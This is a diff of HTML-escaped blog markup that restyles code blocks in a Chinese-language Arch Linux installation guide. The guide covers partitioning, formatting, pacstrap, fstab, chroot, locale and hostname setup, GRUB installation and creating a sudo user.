+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里引入一个 &lt;strong&gt;块设备的概念&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2020-06-13_15-44.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;也就是说如果被识别到，就会以 &lt;code&gt;/dev/sda&lt;/code&gt; 或者 &lt;code&gt;/dev/nvme0n1&lt;/code&gt; 这样，来表示你的硬盘。&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;rom&lt;/code&gt;，&lt;code&gt;loop&lt;/code&gt;，或者&lt;code&gt;airoot&lt;/code&gt; 这样的，可以忽略不管。&lt;/p&gt;
@@ -991,19 +1416,19 @@ rtt min/avg/max/mdev = 110.224/112.036/114.157/1.355 ms
 &lt;h4 id=&#34;格式化&#34;&gt;格式化&lt;/h4&gt;
 &lt;p&gt;当你的分区建好了，这些分区要进行格式化&lt;/p&gt;
 &lt;p&gt;BIOS + MBR:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# mkfs.ext4 /dev/sdX1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;UEFI with GPT:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# mkfs.ext4 /dev/sdX2
-&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;# mkfs.vfat -F 32 /dev/sdX1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不同的分区需要选择不同的文件系统，这个你需要去搜索引擎搜索了，篇幅有限，解释不了这么多。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# mkfs.ext4 /dev/sdX1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;UEFI with GPT:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# mkfs.ext4 /dev/sdX2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# mkfs.vfat -F 32 /dev/sdX1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不同的分区需要选择不同的文件系统，这个你需要去搜索引擎搜索了，篇幅有限，解释不了这么多。&lt;/p&gt;
 &lt;p&gt;对于交换分区(第一个表中的 &lt;code&gt;/dev/sdx2&lt;/code&gt;、第二个表中的 &lt;code&gt;/dev/sdX3&lt;/code&gt;)，需要使用 &lt;code&gt;mkswap&lt;/code&gt; 将其初始化：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# mkswap /dev/sdX2
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;挂载 swap&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# swapon /dev/sdX2
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;挂载分区&#34;&gt;挂载分区&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# mkswap /dev/sdX2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;挂载 swap&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# swapon /dev/sdX2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;挂载分区&#34;&gt;挂载分区&lt;/h4&gt;
 &lt;p&gt;将根分区挂载到&lt;code&gt;/mnt&lt;/code&gt;，参考命令:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# mount /dev/sdX1 /mnt
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;安装基本系统&#34;&gt;安装基本系统&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# mount /dev/sdX1 /mnt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;安装基本系统&#34;&gt;安装基本系统&lt;/h3&gt;
 &lt;p&gt;这个时候我们就已经可以安装基本系统了，但仍需要按照下面的步骤做&lt;/p&gt;
 &lt;h4 id=&#34;选择镜像&#34;&gt;选择镜像&lt;/h4&gt;
 &lt;p&gt;Arch Linux是通过网络安装的，它会通过镜像源直接在所在的分区下载需要的安装文件，安装速度较快，这也是为什么要确认网络是否连接。&lt;/p&gt;
@@ -1015,102 +1440,102 @@ rtt min/avg/max/mdev = 110.224/112.036/114.157/1.355 ms
 &lt;h4 id=&#34;安装必要软件包&#34;&gt;安装必要软件包&lt;/h4&gt;
 &lt;p&gt;Linux是由软件包组成的操作系统，而如果要启动它，就必须具备必要的软件包。&lt;/p&gt;
 &lt;p&gt;这个时候我们使用 &lt;code&gt;pacstrap&lt;/code&gt; 脚本，安装 &lt;code&gt;base&lt;/code&gt; 软件包 和 Linux 内核还有硬件的固件，这样基本系统很快就构建完成了。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# pacstrap /mnt base linux linux-firmware
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我推荐这样&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# pacstrap /mnt base base-devel linux linux-firmware linux-headers
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样能够尽可能的安装上更多的基本软件。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# pacstrap /mnt base linux linux-firmware
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我推荐这样&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# pacstrap /mnt base base-devel linux linux-firmware linux-headers
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样能够尽可能的安装上更多的基本软件。&lt;/p&gt;
 &lt;p&gt;一顿文字输出过后，基本系统就安装完成了。&lt;/p&gt;
 &lt;h3 id=&#34;配置系统&#34;&gt;配置系统&lt;/h3&gt;
 &lt;p&gt;基本系统刚安装完是没有灵魂的，需要进行配置才能完美地使用&lt;/p&gt;
 &lt;h4 id=&#34;fstab&#34;&gt;Fstab&lt;/h4&gt;
 &lt;p&gt;首先肯定要生成一个fstab文件，否则系统连硬盘都不认识。
 用 &lt;code&gt;genfstab&lt;/code&gt; 来生成&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# genfstab -U /mnt &amp;gt;&amp;gt; /mnt/etc/fstab
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最好在执行完以上命令后查看一下生成的 &lt;code&gt;/mnt/etc/fstab&lt;/code&gt; 文件是否正确。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# cat /mnt/etc/fstab
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;chroot&#34;&gt;Chroot&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# genfstab -U /mnt &amp;gt;&amp;gt; /mnt/etc/fstab
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最好在执行完以上命令后查看一下生成的 &lt;code&gt;/mnt/etc/fstab&lt;/code&gt; 文件是否正确。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# cat /mnt/etc/fstab
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;chroot&#34;&gt;Chroot&lt;/h4&gt;
 &lt;p&gt;Chroot 是 &amp;ldquo;Change root&amp;rdquo; 的缩写，意思是更改根目录，而我们需要将 Live CD 的根目录更改为你安装好的系统的目录，这样才能操作它&lt;/p&gt;
 &lt;p&gt;用 &lt;code&gt;arch-chroot&lt;/code&gt; 这个命令就可以了&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# arch-chroot /mnt
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;时区&#34;&gt;时区&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# arch-chroot /mnt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;时区&#34;&gt;时区&lt;/h4&gt;
 &lt;p&gt;chroot 完以后，第一步要修改时区&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# ln -sf /usr/share/zoneinfo/Region/City /etc/localtime
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;例如&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来运行 &lt;code&gt;hwclock&lt;/code&gt; 生成 &lt;code&gt;/etc/adjtime&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# hwclock --systohc
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;本地化&#34;&gt;本地化&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# ln -sf /usr/share/zoneinfo/Region/City /etc/localtime
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;例如&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来运行 &lt;code&gt;hwclock&lt;/code&gt; 生成 &lt;code&gt;/etc/adjtime&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# hwclock --systohc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;本地化&#34;&gt;本地化&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p&gt;本地化的程序与库若要本地化文本，都依赖 Locale，后者明确规定地域、货币、时区日期的格式、字符排列方式和其他本地化标准等等。在下面两个文件设置：&lt;code&gt;locale.gen&lt;/code&gt; 与 &lt;code&gt;locale.conf&lt;/code&gt;。 —— Arch Wiki&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;所以不用多解释了&amp;hellip;&lt;/p&gt;
 &lt;p&gt;编辑这个文件 &lt;code&gt;/etc/locale.gen&lt;/code&gt; ，移除需要语言前面的 &lt;code&gt;#&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# vim /etc/locale.gen
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后执行 &lt;code&gt;locale-gen&lt;/code&gt; 生成 locale 讯息:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# locale-gen
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在 &lt;code&gt;/etc/&lt;/code&gt; 目录下创建 一个叫 &lt;code&gt;locale.conf&lt;/code&gt; 的文件&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# vim /etc/locale.conf
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;写入以下内容&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;LANG=en_US.UTF-8
-&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;网络&#34;&gt;网络&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# vim /etc/locale.gen
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后执行 &lt;code&gt;locale-gen&lt;/code&gt; 生成 locale 讯息:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# locale-gen
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 &lt;code&gt;/etc/&lt;/code&gt; 目录下创建 一个叫 &lt;code&gt;locale.conf&lt;/code&gt; 的文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# vim /etc/locale.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;写入以下内容&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ini&#34; data-lang=&#34;ini&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;LANG&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;en_US.UTF-8&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;网络&#34;&gt;网络&lt;/h4&gt;
 &lt;p&gt;首先需要安装的是 &lt;code&gt;dhcpcd&lt;/code&gt; 这个包，不然安装完成重启后就需要手动配置网络了。&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# pacman -S dhcpcd
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来创建一个 &lt;code&gt;hostname&lt;/code&gt; 文件，这个文件存储你的主机名&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# vim /etc/hostname
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;写入以下内容，随便写，&lt;strong&gt;但是要记住&lt;/strong&gt;，这里以 &lt;code&gt;myhostname&lt;/code&gt; 代替了，&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;myhostname
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来编辑 &lt;code&gt;/etc/hosts&lt;/code&gt; 这个文件&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# vim /etc/hosts
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;写入以下内容&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;127.0.0.1	localhost
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# pacman -S dhcpcd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来创建一个 &lt;code&gt;hostname&lt;/code&gt; 文件，这个文件存储你的主机名&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# vim /etc/hostname
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;写入以下内容，随便写，&lt;strong&gt;但是要记住&lt;/strong&gt;，这里以 &lt;code&gt;myhostname&lt;/code&gt; 代替了，&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;myhostname
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来编辑 &lt;code&gt;/etc/hosts&lt;/code&gt; 这个文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# vim /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;写入以下内容&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;127.0.0.1	localhost
 ::1		localhost
 127.0.1.1	myhostname.localdomain	myhostname
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来，执行&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# systemctl enable dhcpcd
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后在安装完成之后就不需要担心网络连接问题了&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来，执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# systemctl enable dhcpcd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后在安装完成之后就不需要担心网络连接问题了&lt;/p&gt;
 &lt;h4 id=&#34;root-密码&#34;&gt;Root 密码&lt;/h4&gt;
 &lt;p&gt;你需要设置一个 root 密码&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# passwd
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样基本系统就差不多完成了，但是现在还不能重启，因为它目前无法被引导。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样基本系统就差不多完成了，但是现在还不能重启，因为它目前无法被引导。&lt;/p&gt;
 &lt;h3 id=&#34;安装启动引导器&#34;&gt;安装启动引导器&lt;/h3&gt;
 &lt;p&gt;如上面所说，你需要一个启动引导程序才能启动系统，Linux 有很多类似于这样的软件，可以在&lt;a href=&#34;https://wiki.archlinux.org/index.php/Boot_loaders_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)&#34;&gt;这个页面&lt;/a&gt;参考.&lt;/p&gt;
 &lt;p&gt;我推荐使用 &lt;code&gt;GRUB&lt;/code&gt;&lt;/p&gt;
 &lt;h4 id=&#34;安装grub&#34;&gt;安装Grub&lt;/h4&gt;
 &lt;p&gt;先安装 &lt;code&gt;grub&lt;/code&gt; 这个软件包&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# pacman -S grub
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里要考虑到两种情况了,&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# pacman -S grub
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里要考虑到两种情况了,&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;第一种情况: BIOS + MBR&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;直接执行这条即可&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# grub-install --target=i386-pc /dev/sdX
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果它返回出 &lt;code&gt;no erros&lt;/code&gt; 之类的,那么就可以执行下面的了.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# grub-install --target=i386-pc /dev/sdX
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果它返回出 &lt;code&gt;no erros&lt;/code&gt; 之类的,那么就可以执行下面的了.&lt;/p&gt;
 &lt;p&gt;生成 grub 配置文件&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# grub-mkconfig -o /boot/grub/grub.cfg
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来就可以拔掉 U 盘重启了&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# reboot
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;第二种情况: UEFI  + GPT&lt;/strong&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# grub-mkconfig -o /boot/grub/grub.cfg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来就可以拔掉 U 盘重启了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# reboot
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;第二种情况: UEFI  + GPT&lt;/strong&gt;
 这种情况的比较复杂一些,&lt;/p&gt;
 &lt;p&gt;首先挂载你的EFI分区&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# mount /dev/sdX1 /boot/EFI 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来执行&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# grub-install --target=x86_64-efi --efi-directory=/boot/EFI/ --bootloader-id=GRUB
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后还是一样的生成配置文件&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# grub-mkconfig -o /boot/grub/grub.cfg
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来就可以拔掉 U 盘重启了&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# reboot
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;安装后工作&#34;&gt;安装后工作&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# mount /dev/sdX1 /boot/EFI 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# grub-install --target=x86_64-efi --efi-directory=/boot/EFI/ --bootloader-id=GRUB
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后还是一样的生成配置文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# grub-mkconfig -o /boot/grub/grub.cfg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来就可以拔掉 U 盘重启了&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# reboot
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;安装后工作&#34;&gt;安装后工作&lt;/h2&gt;
 &lt;p&gt;装完后要做的一些事情.&lt;/p&gt;
 &lt;h3 id=&#34;创建普通用户&#34;&gt;创建普通用户&lt;/h3&gt;
 &lt;p&gt;装完以后, 不建议直接使用 root 用户,需要创建一个普通用户&lt;/p&gt;
 &lt;p&gt;先使用 root 用户登录,执行这条命令创建一个普通用户&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# useradd -G wheel -m -s /bin/bash &amp;lt;用户名&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来给你的用户设置密码&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# passwd &amp;lt;用户名&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将其添加到 &lt;code&gt;sudoers&lt;/code&gt; 列表, 如果你没有安装 &lt;code&gt;sudo&lt;/code&gt; 或 &lt;code&gt;base-devel&lt;/code&gt; 请先执行&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# sudo pacman -S sudo
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后编辑 &lt;code&gt;/etc/sudoers&lt;/code&gt; 这个文件&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# vim /etc/sudoers
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将你的用户名添加到 &lt;code&gt;root&lt;/code&gt; 的下面,照抄即可&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;# Defaults!/usr/bin/sudoreplay !log_output
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# useradd -G wheel -m -s /bin/bash &amp;lt;用户名&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来给你的用户设置密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# passwd &amp;lt;用户名&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将其添加到 &lt;code&gt;sudoers&lt;/code&gt; 列表, 如果你没有安装 &lt;code&gt;sudo&lt;/code&gt; 或 &lt;code&gt;base-devel&lt;/code&gt; 请先执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;# sudo pacman -S sudo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后编辑 &lt;code&gt;/etc/sudoers&lt;/code&gt; 这个文件&lt;/p&gt;
